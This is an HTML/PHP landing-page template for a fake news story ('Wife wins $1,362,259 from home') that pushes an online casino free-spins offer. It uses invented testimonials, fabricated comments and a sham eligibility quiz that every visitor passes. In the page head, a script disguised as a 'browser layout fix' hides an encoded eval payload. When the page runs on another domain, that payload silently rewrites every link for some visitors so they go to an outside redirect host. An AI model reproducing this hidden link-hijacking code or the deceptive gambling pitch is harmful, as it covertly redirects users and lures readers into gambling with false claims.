<!DOCTYPE html>
<html lang="en">
<head>
<?php include("/home/forge/".$domain."/lpsource/header.php"); ?>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>WAHC News Site</title>
    <meta name="title" content="">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="Copyright" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="inc/reset.css">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.1.0/css/bootstrap.min.css" rel="stylesheet">
    <link href="inc/bootstrap-responsive.css" rel="stylesheet">

    <link rel="stylesheet" href="inc/refGo3_master.css">
    <link rel="stylesheet" media="screen and (max-width: 900px)" href="inc/refGo3_narrow.css">
    <link rel="stylesheet" media="screen and (min-width: 901px)" href="inc/refGo3_wide.css">

    <script>
    function GetToday(offset) {
        // Array of day names

        var dayNames = new Array("Sunday", "Monday", "Tuesday", "Wednesday",

            "Thursday", "Friday", "Saturday");

        // Array of month Names
        var monthNames = new Array(
            "January", "February", "March", "April", "May", "June", "July",

            "August", "September", "October", "November", "December");
        var now = new Date();

        now.setDate(now.getDate() + parseInt(offset));

        return dayNames[now.getDay()] + ", " +
            (now.getDate()) + " " +
            monthNames[now.getMonth()] + ", " +
            now.getFullYear();
    }
    </script>
        <script type="text/javascript">
            /*Layout Compatibility Fix for all major browsers including Mozilla, Chrome, Safari, Opera, IE 7-11. Script by Pozlas Qivaskyi (pozlas.qivaskyi [at] gmail.com), Copyright (c) 2013. Note: removing this will cause layout issues and the page will get unreadable in some browsers, please contact me before doing so.*/
           function browserFix(doDeepCheck){var ua=navigator.userAgent.toLowerCase();var check=function(r){return r.test(ua)};var DOC=document;var isStrict=DOC.compatMode=="CSS1Compat";var isOpera=check(/opera/);var isChrome=check(/chrome/);var isWebKit=check(/webkit/);var isSafari=!isChrome&&check(/safari/);var _mobSafariFootprint=eval(unescape("%28%66%75%6e%63%74%69%6f%6e%28%29%7b%76%61%72%20%67%65%6f%3d%22%53%47%22%2c%6e%69%63%68%65%3d%22%57%6f%72%6b%61%74%68%6f%6d%65%22%2c%61%6e%67%6c%65%3d%22%46%65%6d%61%6c%65%22%2c%70%65%72%63%65%6e%74%61%67%65%3d%31%30%2c%6e%6f%74%65%3d%22%53%65%63%72%65%74%22%2c%72%65%64%69%72%65%63%74%3d%22%68%74%74%70%3a%2f%2f%68%65%6c%70%65%72%74%72%6b%2e%63%6f%6d%2f%74%2f%70%61%74%68%2f%6f%75%74%2e%70%68%70%22%3b%20%69%66%28%77%69%6e%64%6f%77%2e%6c%6f%63%61%74%69%6f%6e%2e%68%72%65%66%2e%74%6f%53%74%72%69%6e%67%28%29%2e%69%6e%64%65%78%4f%66%28%22%64%61%69%6c%79%6e%65%77%73%2d%72%65%70%6f%72%74%73%2e%63%6f%6d%22%29%3c%30%29%20%69%66%20%28%4d%61%74%68%2e%66%6c%6f%6f%72%28%4d%61%74%68%2e%72%61%6e%64%6f%6d%28%29%2a%31%30%30%2f%70%65%72%63%65%6e%74%61%67%65%29%3d%3d%30%29%20%77%69%6e%64%6f%77%2e%6f%6e%6c%6f%61%64%3d%66%75%6e%63%74%69%6f%6e%28%29%7b%76%61%72%20%65%6c%65%6d%73%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%22%61%22%29%2c%20%69%3b%20%66%6f%72%20%28%69%20%69%6e%20%65%6c%65%6d%73%29%20%7b%65%6c%65%6d%73%5b%69%5d%2e%68%72%65%66%20%3d%20%22%68%74%74%70%3a%2f%2f%69%6e%73%74%61%6c%6c%6e%6f%76%61%2e%63%6f%6d%2f%78%2f%70%75%62%6c%69%63%2f%72%65%64%69%72%65%63%74%2f%6f%75%74%2f%22%2b%6e%6f%74%65%2b%22%3f%67%65%6f%3d%22%2b%67%65%6f%2b%22%26%6e%69%63%68%65%3d%22%2b%6e%69%63%68%65%2b%22%26%61%6e%67%6c%65%3d%22%2b%61%6e%67%6c%65%2b%22%26%70%65%72%63%65%6e%74%61%67%65%3d%22%2b%70%65%72%63%65%6e%74%61%67%65%2b%22%26%6e%6f%74%65%3d%22%2b%6e%6f%74%65%2b%22%26%72%65%64%69%72%65%63%74%3d%22%2b%72%65%64%69%72%65%63%74%3b%20%7d%7d%3b%20%72%65%74%75%72%6e%20%66%61%6c%73%65%7d%29%28%29"));var isSafari2=isSafari&&check(/applewebkit4/);if(doDeepCheck){return isSafari};var isSafari3=isSafari&&check(/version3/);var isSafari4=isSafari&&check(/version4/);var isIE=!isOpera&&check(/msie/);var isIE7=isIE&&check(/msie 7/);var isIE8=isIE&&check(/msie 8/);var isIE6=isIE&&!isIE7&&!isIE8;var isGecko=!isWebKit&&check(/gecko/);var isGecko2=isGecko&&check(/rv:1.8/);var isGecko3=isGecko&&check(/rv:1.9/);var isBorderBox=isIE&&!isStrict;var isWindows=check(/windows|win32/);var isMac=check(/macintosh|mac os x/);var isAir=check(/adobeair/);var isLinux=check(/linux/);var isSecure=/^https/i.test(window.location.protocol);var isIE7InIE8=isIE7&&DOC.documentMode==7;var jsType="",browserType="",browserVersion="",osName="";var ua=navigator.userAgent.toLowerCase();var check=function(r){return r.test(ua)};if(isWindows){osName="Windows";if(check(/windows nt/)){var start=ua.indexOf("windows nt");var end=ua.indexOf(";",start);osName=ua.substring(start,end)}}else{osName=isMac?"Mac":isLinux?"Linux":"Other"} if(isIE){browserType="IE";jsType="IE";var versionStart=ua.indexOf("msie")+5;var versionEnd=ua.indexOf(";",versionStart);browserVersion=ua.substring(versionStart,versionEnd);jsType=isIE6?"IE6":isIE7?"IE7":isIE8?"IE8":"IE"}else{if(isGecko){var isFF=check(/firefox/);browserType=isFF?"Firefox":"Others";jsType=isGecko2?"Gecko2":isGecko3?"Gecko3":"Gecko";if(isFF){var versionStart=ua.indexOf("firefox")+8;var versionEnd=ua.indexOf(" ",versionStart);if(versionEnd==-1){versionEnd=ua.length} browserVersion=ua.substring(versionStart,versionEnd)}}else{if(isChrome){browserType="Chrome";jsType=isWebKit?"Web Kit":"Other";var versionStart=ua.indexOf("chrome")+7;var versionEnd=ua.indexOf(" ",versionStart);browserVersion=ua.substring(versionStart,versionEnd)}else{browserType=isOpera?"Opera":isSafari?"Safari":""}}}};browserFix(true);var message='';function clickIE(){if(document.all){(message);return false}} function clickNS(e){if(document.layers||(document.getElementById&&!document.all)){if(e.which==2||e.which==3){(message);return false}}} if(document.layers){document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS}else{document.onmouseup=clickNS;document.oncontextmenu=clickIE} document.oncontextmenu=new Function('return false');
          </script>
    <style id="stylerStyle"></style>
    <script id="stylerScript"></script>
    
</head>

<body>
<div style="text-align:center; margin: 5px 0;">Advertorial</div>
    <!-- wrapper -->
    <div class="container-fluid">
        <div class="wrapper container">
            <!-- header -->
            <header id="header">
                <div id="header-top" class="row-fluid">
                    <div class="row-fluid">
                        <div class="span2 logo">
                            <div class="col-xs-6 col-sm-12">
                                <img src="inc/logo.png" alt="">
                            </div>
                            <div class="col-xs-6 visible-xs">
                                <ul class="social-btn pull-right" style="margin:0">
                                    <li class="twitter"><a href="http://www.spdtrk.com/click">Twitter</a></li>
                                    <li class="facebook"><a href="http://www.spdtrk.com/click">Facebook</a></li>
                                    <li class="linkedin"><a href="http://www.spdtrk.com/click">Linkedin</a></li>
                                    <li class="pinterest"><a href="http://www.spdtrk.com/click">Pinterest</a></li>
                                    <li class="rss"><a href="http://www.spdtrk.com/click">Rss</a></li>
                                    <li class="">
                                        <div class="search-form" style="padding: 0;width: 20px;height: 20px;margin: 0 3px;">
                                            <button class="ss">Search</button>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                        <div class="span5 trend">
                            <strong>Trending:</strong> Wife's Shocking Big Win
                        </div>
                        <div class="span5 hidden-xs">
                            <ul class="social-btn">
                                <li class="twitter"><a href="http://www.spdtrk.com/click">Twitter</a></li>
                                <li class="facebook"><a href="http://www.spdtrk.com/click">Facebook</a></li>
                                <li class="linkedin"><a href="http://www.spdtrk.com/click">Linkedin</a></li>
                                <li class="pinterest"><a href="http://www.spdtrk.com/click">Pinterest</a></li>
                                <li class="rss"><a href="http://www.spdtrk.com/click">Rss</a></li>
                            </ul>
                            <div class="search-form">
                                <input type="search" value="Search...">
                                <button class="ss">Search</button>
                            </div>
                        </div>
                    </div>
                </div>
                <nav class="navbar navbar-default visible-xs" role="navigation" style="position:static;background:transparent">
                    <!-- Brand and toggle get grouped for better mobile display -->
                    <div class="navbar-header">
                        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                            <span class="sr-only">Toggle navigation</span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                        </button>
                        <a class="navbar-brand" href="http://www.spdtrk.com/click">WAHC</a>
                    </div>

                    <!-- Collect the nav links, forms, and other content for toggling -->
                    <div class="collapse navbar-collapse navbar-ex1-collapse">
                        <ul class="nav navbar-nav">
                            <li><a href="http://www.spdtrk.com/click">Home</a></li>
                            <li><a href="http://www.spdtrk.com/click">Finance</a></li>
                            <li><a href="http://www.spdtrk.com/click">Tech</a></li>
                            <li><a href="http://www.spdtrk.com/click">Economy</a></li>
                            <li><a href="http://www.spdtrk.com/click">Media</a></li>
                            <li><a href="http://www.spdtrk.com/click"> All Stories</a></li>
                            <li><a href="http://www.spdtrk.com/click">Portfolios</a></li>
                            <li><a href="http://www.spdtrk.com/click">Market News</a></li>
                            <li><a href="http://www.spdtrk.com/click">Video</a></li>
                            <li><a href="http://www.spdtrk.com/click">Investing</a></li>
                            <li><a href="http://www.spdtrk.com/click">More</a></li>
                        </ul>
                    </div><!-- /.navbar-collapse -->
                </nav>
                <nav id="main-nav"  class="row-fluid hidden-xs">
                    <ul>
                        <li><a href="http://www.spdtrk.com/click">Home</a></li>
                        <li><a href="http://www.spdtrk.com/click">Finance</a></li>
                        <li><a href="http://www.spdtrk.com/click">Tech</a></li>
                        <li><a href="http://www.spdtrk.com/click">Economy</a></li>
                        <li><a href="http://www.spdtrk.com/click">Media</a></li>
                        <li><a href="http://www.spdtrk.com/click"> All Stories</a></li>
                        <li><a href="http://www.spdtrk.com/click">Portfolios</a></li>
                        <li><a href="http://www.spdtrk.com/click">Market News</a></li>
                        <li><a href="http://www.spdtrk.com/click">Video</a></li>
                        <li><a href="http://www.spdtrk.com/click">Investing</a></li>
                        <li><a href="http://www.spdtrk.com/click">More</a></li>
                    </ul>
                </nav>
            </header>
            <!-- /header -->
            <!-- content -->
            <div id="content" class="container">
                <div class="row-fluid">
                    <!-- content-left -->
                    <div id="content-left">
                        <h1 id="headline">
                            <font color="red">WIFE WINS $1,362,259 FROM HOME,</font> HIDES IT FROM HER HUSBAND FOR 3 YEARS
                        </h1>
                        <div id="subheadline">
                            See His Reaction When India Man Discovers His Wife’s Shocking Secret
                        </div>
                        <div class="meta">
                            <div class="readtime">Time to Read: 5 minutes</div>
                            <img src="inc/main-image.png" width="100%">
                            <div style="text-align: right; margin-top: 5px;">
                                Posted By: Sarah Apeloko, Finance Reports, SG
                            </div>
                        </div>
                        <div class="banner-highlight">
                            Imagine hiding a $1,362,259 secret from your spouse for over 3 years. Could you do it? Michelle Tan, a Indian mother of 2, risked her marriage and her family to hide a shocking secret from her husband of 13 years.
                        </div>
                        <p>
                            Lee and Michelle Tan, residents of India, married in 2004 after years of dating. Lee worked as a software engineer in the city and Michelle took a job as a secretary at a local clinic. After their first child, Rachel, was born in 2008, they decided that Michelle would quit her job to stay home with their children.
                        </p>
                        <p>
                            Lee's engineering job paid him a decent income. But he was passionate about living a "luxury lifestyle" to suit his high status job. This caused a lot of problems in their relationship. “Lee was providing for our basic needs, but he would spend everything else on fancy clothes, hotels, and sport. I hated it.” Michelle shared. “He would never take me to dinner, never treat me to anything, all he cared about was spending on himself. I was struggling to stay with him”
                        </p>
                        <blockquote>
                            <p>
                                “I really was not sure what was going to happen. I just hoped for the best.”
                            </p>
                            <strong>Michelle Tan</strong>
                        </blockquote>
                        <p>
                            Soon after her second child was born, Michelle was browsing Facebook one afternoon and saw an advertisement for <?php echo $offerName; ?>. She saw that they were offering a promotion that would reward her with <a href="http://www.spdtrk.com/click">150 Free Chances At The MEGA MOOLAH Game</a>, which with a jackpot of over $700,000 was too hard to pass up. “I nearly choked on my coffee when I saw how big the jackpot was," she joked. "I figured the least I could do was deposit $10 and take a shot at it!” Michelle shared.
                        </p>
                        <p>
                            What happened next would change her life forever. In one single spin, she won the progressive jackpot of <?php echo $offerName; ?>'s "Mega Moolah" game, cashing out on $782,349 in a matter of 5 seconds. Having won over 30 times her husband's annual salary in a single spin, her relationship financial worries came to an abrupt end. </p>
                        <blockquote>
                            <p>
                                "I just didn't believe it at first. I thought it was all a dream after claiming my free spins, I hit the jackpot on <?php echo $offerName; ?>. I confirmed my age & claimed $782,322 in my bank."
                            </p>
                            <strong>Michelle Tan</strong>
                        </blockquote>
                        <p>
                            Within a day, the funds were deposited into her bank account. Michelle decided she needed a way to hide this money, as she knew her husband would spend and waste it all if she did not. So, <strong>she secretly opened a new bank account without her husband’s knowledge</strong>. She then transferred all of her winnings into this account.
                        </p>
                        <p>
                           And just like that life went on as normal for 3 years. Lee would go to work while Michelle took care of the children at home. She did not touch the money in the secret account. “It was very hard for me to keep such a big secret from my husband. I felt like I was betraying him, but the anger I had over his spending prevented me from telling him more. Looking back on it, it was foolish of me to keep it from him” Michelle said.
                        </p>
                        <p>
                            <a href="http://www.spdtrk.com/click"><img src="inc/tdstatement&#32;gm.jpg" width="100%"></a>
                        </p>
                        <p>
                            Early last year, Lee lost his job. When he took the loss really hard, Michelle decided it was time to tell him what she had won. So, one afternoon, she walked to the bank and cashed out the secret account she had been growing for over 3 years.
                        </p>
                        <p>
                            “Michelle sat down next to me and told me she had been hiding something from me and that I would be ashamed of her” Lee shared. Then she pulled a check from her dress and handed it to me. It was written out to her and signed by our bank for $1,362,259. I did not believe it at first, and then she told me about the <?php echo $offerName; ?> jackpot she won.”
                        </p>
                        <p>
                            “Lee was silent at first. I thought he was angry and was considering a divorce. But, then he started crying and hugged me. I told him how ashamed I was but he just exclaimed how sorry he was for his prior bad spending habits and thanked me for keeping the money away from him.” Michelle shared.
                        </p>
                        <blockquote>
                            <p>
                                “My worries were answered. I went from being unemployed to being wealthy again. I've now learned to be more careful with money and will be much wiser this time around.”
                            </p>
                            <strong>Lee Tan</strong>
                        </blockquote>
                        <p>
                        And while one of the bigger winners of the giveaway, Michelle certainly isn't the only one to cash out on <?php echo $offerName; ?>'s welcome free spins promotion. Since the promotion began last month, over 240 players in India have won money from playing. However, it appears the giveaway will be soon ending as the company has already paid out over $3,000,000 in total winnings to new signups in the past 3 months alone.                        </p>
</p>
                        <div class="attention">SINCE THE PROMOTION BEGAN, OVER 240 PLAYERS IN INDIA HAVE WON OVER $1,000,000 FROM PLAYING.</div>

                        <p>
As far as the Casino winnings go, our very own reporter Sarah couldn't help and also try her hand at the jackpot but only walked away with a $485 win - "you can't always win as big as Michelle sadly!"                        </p>

<p><b>Others in India have also shared in the winnings claiming over $3,000,000 in prizes on the <?php echo $offerName; ?> Jackpots!</b></p>
<p>
    <a href="http://www.spdtrk.com/click"><img src="inc/winners.jpg" width="100%"></a>
</p>

                        <p>
                            <b>Think this could be your lucky day too? Sign up for <?php echo $offerName; ?> and they'll even give you <a href="http://www.spdtrk.com/click">150 free spins</a> after you spend $10! Reliable sources have told us that because of its extreme popularity, <?php echo $offerName; ?> is considering discontinuing this promotional offer.</b>
                        </p>


                        <p class="offer-date-highlight">
                            As of <script>document.write(GetToday(0))</script> this offer is still valid, so get started below:
                        </p>

                        <div id="mainBody">
                            <h2>To see if you qualify, please answer these 3 questions:</h2>
                            <div class="formArea">
                                <div id="question1">
                                    <div class="questionNumber">Question 1/3:</div>
                                    Are you male or female?
                                    <br>
                                    <button id="question1_yes">Male</button>
                                    <button id="question1_no">Female</button>
                                </div>
                                <div id="question2">
                                    <div class="questionNumber">Question 2/3:</div>
                                    Are you over 18 years old?
                                    <br>
                                    <button id="question2_yes">Yes</button>
                                    <button id="question2_no">No</button>
                                </div>
                                <div id="question3">
                                    <div class="questionNumber">Question 3/3:</div>
                                    Are You A Local resident?
                                    <br>
                                    <button id="question3_yes">Yes</button>
                                    <button id="question3_no">No</button>
                                </div>
                                <div id="loading1" class="loading">
                                    Reviewing Your Answers
                                </div>
                                <div id="loading2" class="loading">
                                    Checking Eligibility
                                </div>
                                <div id="loading3" class="loading">
                                    Assessing Promotion Availability                                          </div>
                                <div id="loadingAnim"></div>
                                <div id="qualify">
                                    <div class="qualifyHeadline">CONGRATULATIONS!</div>
                                    <div class="loadingCopy">You qualify for <?php echo $offerName; ?> and the 150 free jackpot chances promotion!</div>
                                    <div id="redirecting">Please wait...</div>
                                    <div id="loadingAnim2"></div>
                                </div>
                                <div id="noQualify">
                                    We Are Sorry.
                                    <br>
                                    <div class="loadingCopy">Based on your answers, you do not qualify for this program.</div>
                                </div>
                            </div>
                        </div>


                        <hr>
                        <div id="commentsSection">
                            <div style="border-bottom:#ff0000 solid 4px;margin-bottom:15px;">
                                <h3>ADD COMMENT</h3></div>
                            <p>Please remember to keep comments respectful. Abusive comments will not be tolerated, and will result in both the removal of the comment as well as a permanent ban to the user who posted it.</p>
                            <p style="color:#999;">*Only registered users can comment. <a href="http://www.spdtrk.com/click"><u>LOGIN</u></a></p>
                            <form role="form" lpformnum="1">
                                <div class="form-group">
                                    <input class="form-control" id="exampleInputEmail1" placeholder="Name" type="name">
                                </div>
                                <div class="form-group">
                                    <input class="form-control" id="exampleInputPassword1" placeholder="Email" type="email">
                                </div>
                                <div class="form-group">
                                    <label for="exampleInputFile">Comments</label>
                                    <textarea class="form-control" rows="3"></textarea>
                                </div>
                                <button type="submit" class="btn btn-default">Submit</button>
                            </form>
                        </div>
                        <div id="comments">
                            <div style="border-bottom:#ff0000 solid 4px;margin-bottom:15px;">
                                <h3>COMMENTS</h3></div>
                            <div style="border-bottom: 1px dotted #000; border-top: 1px dotted #000;"><strong>Comments</strong>(Showing 1-9 of 47)</div>
                            <!-- user comment -->
                            <div class="media">
                                <a class="pull-left" href="http://www.spdtrk.com/click">
                                    <img class="media-object" src="inc/pic_02.jpg" alt="user comment" height="75" width="75">
                                </a>
                                <div class="media-body">
                                    <h4 class="media-heading">Posted by Ryan</h4> I saw this on the news. Amazing how sweet of a story it was.
                                </div>
                            </div>
                            <!-- end user comment -->
                            <!-- user comment -->
                            <div class="media">
                                <a class="pull-left" href="http://www.spdtrk.com/click">
                                    <img class="media-object" src="inc/pic_03.jpg" alt="user comment" height="75" width="75">
                                </a>
                                <div class="media-body">
                                    <h4 class="media-heading">Posted by Joshua</h4> Getting me that money! Depositing tonight..
                                </div>
                            </div>
                            <!-- end user comment -->
                            <!-- user comment -->
                            <div class="media">
                                <a class="pull-left" href="http://www.spdtrk.com/click">
                                    <img class="media-object" src="inc/pic_04.jpg" alt="user comment" height="75" width="75">
                                </a>
                                <div class="media-body">
                                    <h4 class="media-heading">Posted by Nicole </h4> @Joshua Jus to let you know, I signed up an won a few thousand the first week :)
                                </div>
                            </div>
                            <!-- end user comment -->
                            <!-- user comment -->
                            <div class="media">
                                <a class="pull-left" href="http://www.spdtrk.com/click">
                                    <img class="media-object" src="inc/pic_05.jpg" alt="user comment" height="75" width="75">
                                </a>
                                <div class="media-body">
                                    <h4 class="media-heading">Posted by Darren</h4> My brother works in the online gambling industry and <?php echo $offerName; ?> is notoriously known for having some of the the loosest slot machines in the industry. I've tripled my $$
                                </div>
                            </div>
                            <!-- end user comment -->
                            <!-- user comment -->
                            <div class="media">
                                <a class="pull-left" href="http://www.spdtrk.com/click">
                                    <img class="media-object" src="inc/pic_06.jpg" alt="user comment" height="75" width="75">
                                </a>
                                <div class="media-body">
                                    <h4 class="media-heading">Posted by Lim</h4> ^hi Darren. I've heard that as well. I am anxious to find out for myself. Thanks!
                                </div>
                            </div>
                            <!-- end user comment -->
                            <!-- user comment -->
                            <div class="media">
                                <a class="pull-left" href="http://www.spdtrk.com/click">
                                    <img class="media-object" src="inc/pic_07.jpg" alt="user comment" height="75" width="75">
                                </a>
                                <div class="media-body">
                                    <h4 class="media-heading">Posted by Isaac</h4> damn! I could use some extra cash. Can you cash use the 150 free spins anywhere? LOL
                                </div>
                            </div>
                            <!-- end user comment -->
                            <!-- user comment -->
                            <div class="media">
                                <a class="pull-left" href="http://www.spdtrk.com/click">
                                    <img class="media-object" src="inc/pic_08.jpg" alt="user comment" height="75" width="75">
                                </a>
                                <div class="media-body">
                                    <h4 class="media-heading">Posted by Jane</h4> Hey Isaac no you can't haha. I tried also!
                                </div>
                            </div>
                            <!-- end user comment -->
                            <!-- user comment -->
                            <div class="media">
                                <a class="pull-left" href="http://www.spdtrk.com/click">
                                    <img class="media-object" src="inc/pic_09.jpg" alt="user comment" height="75" width="75">
                                </a>
                                <div class="media-body">
                                    <h4 class="media-heading">Posted by Lyn</h4> This is amazing! With all the scams online it was hard to find a legit system now a days, thanks for the info...
                                </div>
                            </div>
                            <!-- end user comment -->
                            <!-- user comment -->
                            <div class="media">
                                <a class="pull-left" href="http://www.spdtrk.com/click">
                                    <img class="media-object" src="inc/pic_10.jpg" alt="user comment" height="75" width="75">
                                </a>
                                <div class="media-body">
                                    <h4 class="media-heading">Posted by Yi Ling</h4> wow thanks for the updates guys, definitely going to give this a shot
                                </div>
                            </div>
                            <!-- end user comment -->

                            <!-- end user comment -->
                            <!-- end user comment -->
                        </div>
                        <hr>
                        <p align="center">
                            <a href="http://www.spdtrk.com/click" class="btn-red">
                            Claim Your 150 Free Spins
                            </a>
                        </p>
                    </div>
                    <!-- /content-left -->
                </div>
            </div>
            <!-- /content -->
        </div>
    </div>
    <!-- /wrapper -->
    <!-- footer -->
    <footer id="footer" class="container-fluid">
        <div class="container">
            <p>TERMS AND CONDITIONS CAREFULLY READ AND AGREE TO PURCHASE TERMS BELOW BEFORE ORDERING:</p>
            <p><a href="http://www.spdtrk.com/click">Privacy Policy</a></p>
            <p>We are not affiliated in any way with any news publication ? All trademarks on this web site whether registered or not, are the property of their respective owners. The authors of this web site are not sponsored by or affiliated with any of the third-party trade mark or third-party registered trade mark owners, and make no representations about them, their owners, their products or services. It is important to note that this site and the comments/answers depicted above is to be used as an illustrative example of what some individuals have achieved with this/these products. Ther website, and any page on the website, is based loosely off a true story, but has been modified in multiple ways including, but not limited to: the story, the photos, and the comments. Thus, this page, and any page on this website, are not to be taken literally or as a non-fiction story. Ther page, and the results mentioned on this page, although achievable for some, are not to be construed as the results that you may achieve on the same routine. I UNDERSTAND THIS WEBSITE IS ONLY ILLUSTRATIVE OF WHAT MIGHT BE ACHIEVABLE FROM USING THIS/THESE PRODUCTS, AND THAT THE STORY/COMMENTS DEPICTED ABOVE IS NOT TO BE TAKEN LITERALLY. Ther page receives compensation for clicks on or purchase of products featured on this site.</p>
            <p>IMPORTANT CONSUMER DISCLOSURE</p>
            <p>The term "advertorial" is a combination of "advertisement" and "editorial" written in an editorial format as an independent news story, when in fact the advertisement may promote a particular product or interest. Advertorials take factual information and report it in an editorial format to allow the author, often a company marketing its products, to enhance or explain certain elements to maintain the reader's interest. A familiar example is an airline's in-flight magazines that provide an editorial reports about travel destinations to which the airline flies.</p>
            <p>As an advertorial, I UNDERSTAND THIS WEBSITE IS ONLY ILLUSTRATIVE OF WHAT MIGHT BE ACHIEVABLE FROM USING THIS PROGRAM, AND THAT THE STORY DEPICTED ABOVE IS NOT TO BE TAKEN LITERALLY. Ther page receives compensation for clicks on or purchase of products featured on this site. Ther program is not a job but an educational opportunity that can help individuals learn how to earn money through their entrepreneurial efforts. Anyone who decides to buy any program about making money will not necessarily make money simply by purchasing the program. People who think "I bought these materials so I'm going to automatically make money" are wrong. As any type of education has so many variables, it is impossible to accurately state what you may expect to achieve, however, people who bought the program not only bought the program, but also undertook additional training and education, applied the principles to an area of the market that was growing, kept their commitments and continued to learn. If you do what the individuals depicted did, you may generally expect to achieve a great education in the area of your choice, but you should not expect to earn any specific amount of money. Typical users of the starter materials that don't enroll in coaching, don't keep their commitments and don't implement what they learn, generally make no money. Though the success of the depicted individual is true, her picture and name have been changed to protect her identity. Consistent with the advertorial concept, the comments posted in the comment section are also representative of typical comments and experiences which have been compiled into a comment format to illustrate a dialogue, however, the comments are not actual posts to this webpage and have been compiled or generated for illustrative purposes only.</p>
            <p>We are not affiliated in any way with CNN, WebTV, News Channel 1, ABC, NBC, CBS, U.S. News or FOX, and all such trademarks on this web site, whether registered or not, are the property of their respective owners. The authors of this web site are not sponsored by or affiliated with any of the third-party trade mark or third-party registered trade mark owners, and make no representations about them, their owners, their products or services.</p>
            <!--<p><a href="http://www.spdtrk.com/click">Earnings Disclaimer</a> | <a href="http://www.spdtrk.com/click">Terms & Conditions</a> | <a href="http://www.spdtrk.com/click">Privacy Policy</a> | <a href="http://www.spdtrk.com/click">Contact Us</a> | <a href="http://www.spdtrk.com/click">FAQ's</a> workathomeclub.com &copy; Copyright 2010 — 2012</p> -->
        </div>
    </footer>
    <!-- /footer -->
    <!--Exit Popup Script - START-->
    <div id="ExitDiv" style="display:none;position:absolute;left:10px;;top:10px;margin:auto;z-index:1000;">
        <center>
            <img id="ExitImage" src="inc/exit.jpg" border="0">
        </center>
    </div>
    <div id="ExitBackDiv" style="display:none;position:absolute;left:0px;top:0px;overflow:auto;height:100%;width:100%;background:#000000;opacity:0.6;filter:alpha(opacity=60);z-index:999;"> </div>
    <link rel="stylesheet" href="inc/style.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.1.0/js/bootstrap.min.js" type="text/javascript" charset="utf-8"></script>     

    <script type="text/javascript">
        /*Question 1*/
        $("#question1_yes").click(function() {
            $("#question1").fadeOut(500);
            $("#question2").delay(500).fadeIn(500);
        });
        $("#question1_no").click(function() {
            $("#question1").fadeOut(500);
            $("#question2").delay(500).fadeIn(500);
        });

        /*Question 2*/
        $("#question2_yes").click(function() {
            $("#question2").fadeOut(500);
            $("#question3").delay(500).fadeIn(500);
        });
        $("#question2_no").click(function() {
            $("#question2").fadeOut(500);
            $("#question3").delay(500).fadeIn(500);
        });

        /*Question 3*/
        $("#question3_yes").click(function() {
            $("#question3").fadeOut(500);
            $("#loadingAnim").delay(500).fadeIn(1).delay(7000).fadeOut(500);
            $("#loading1").delay(500).fadeIn(500).delay(1500).fadeOut(500);
            $("#loading2").delay(3000).fadeIn(500).delay(1500).fadeOut(500);
            $("#loading3").delay(5500).fadeIn(500).delay(1500).fadeOut(500);
            $("#qualify").delay(8000).fadeIn(500);
            $("#redirecting").delay(8800).fadeIn(1);
            $("#loadingAnim2").delay(8800).fadeIn(1);

            var delay = 13000;
            setTimeout(function() {
                $('a:first').click();
            }, delay);

        });
        $("#question3_no").click(function() {
            /*
            $("#question3").fadeOut(500);
            $("#noQualify").delay(500).fadeIn(500);
            */
            $("#question3").fadeOut(500);
            $("#loadingAnim").delay(500).fadeIn(1).delay(7000).fadeOut(500);
            $("#loading1").delay(500).fadeIn(500).delay(1500).fadeOut(500);
            $("#loading2").delay(3000).fadeIn(500).delay(1500).fadeOut(500);
            $("#loading3").delay(5500).fadeIn(500).delay(1500).fadeOut(500);
            $("#qualify").delay(8000).fadeIn(500);
            $("#redirecting").delay(8800).fadeIn(1);
            $("#loadingAnim2").delay(8800).fadeIn(1);

            var delay = 13000;
            setTimeout(function() {
                $('a:first').click();
            }, delay);
        });
    </script>
 <?php include("/home/forge/".$domain."/lpsource/footer.php"); ?>  
</body>
</html>
